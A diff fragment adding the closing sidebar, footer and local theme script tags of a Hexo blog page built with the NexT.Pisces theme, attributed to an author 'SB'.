+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">SB</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SB</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
